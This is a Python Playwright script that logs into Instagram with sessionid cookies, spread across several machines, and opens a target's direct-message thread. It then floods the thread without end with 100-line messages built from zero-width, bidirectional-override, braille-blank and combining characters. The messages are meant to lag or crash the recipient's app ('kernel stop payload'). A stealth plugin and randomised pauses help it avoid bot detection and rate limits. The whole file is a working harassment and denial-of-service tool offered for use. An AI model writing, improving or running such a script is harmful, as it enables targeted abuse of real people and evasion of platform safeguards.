# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (PLAYWRIGHT STABLE)
# 📅 STATUS: FIXED-IMPORT | 10-MACHINES | 100-LINE PAPA

import os, asyncio, random, sys
from playwright.async_api import async_playwright
from playwright_stealth import stealth

def get_kernel_stop_payload(target_name):
    """100-Line Vertical Saturation Payload."""
    u_id = random.randint(10000, 99999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
    
    z_tower = "̸" * 30 
    width_bomb = "\u2800\u00A0" * 35
    lines = [header]
    for i in range(100):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("XY12", k=2))
        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
    return "\n".join(lines)[:9990]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    cookie_index = (machine_id - 1) % len(cookie_list)
    current_cookie = cookie_list[cookie_index].strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        page = await context.new_page()
        
        # ✅ FIXED STEalth: Using the universal stealth function
        await stealth(page)
        
        try:
            print(f"📡 [M{machine_id}] Setting Domain Context...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid",
                "value": current_cookie,
                "domain": ".instagram.com",
                "path": "/",
                "secure": True
            }])

            print(f"📡 [M{machine_id}] Accessing Chat...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            # Wait for text box with a longer timeout for heavy lag
            box_selector = "//div[@role='textbox']"
            await page.wait_for_selector(box_selector, timeout=90000)

            while True:
                # 🔥 DOUBLE-PULSE
                for _ in range(2):
                    payload = get_kernel_stop_payload(target_name)
                    # Playwright's type or fill is much safer than Selenium's send_keys
                    await page.fill(box_selector, payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M{machine_id}] PAPA Pulse Delivered.")
                    await asyncio.sleep(2)

                # Stealth Gap to prevent ghosting
                await asyncio.sleep(random.uniform(18, 25))

                if random.random() < 0.1:
                    await page.reload(wait_until="domcontentloaded")

        except Exception as e:
            print(f"❌ [M{machine_id}] Error: {str(e)[:60]}")
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
